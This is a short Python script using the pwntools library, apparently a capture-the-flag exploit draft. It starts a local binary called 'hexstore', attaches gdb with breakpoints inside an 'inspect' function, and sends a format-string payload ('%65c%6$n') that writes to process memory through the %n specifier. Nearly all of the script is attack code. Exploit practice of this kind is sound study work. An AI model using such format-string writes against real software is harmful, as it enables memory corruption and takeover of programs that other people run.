from pwn import * 


binary = './hexstore'


p = process(binary)

s = '''
#b * printf
b * inspect+397
b * inspect+156
'''


p.sendline("1")




gdb.attach(p, s)
payload = flat(
	b"AAAAAAAA"
	b"%65c%6$n"
)

p.sendline(payload)
p.interactive()
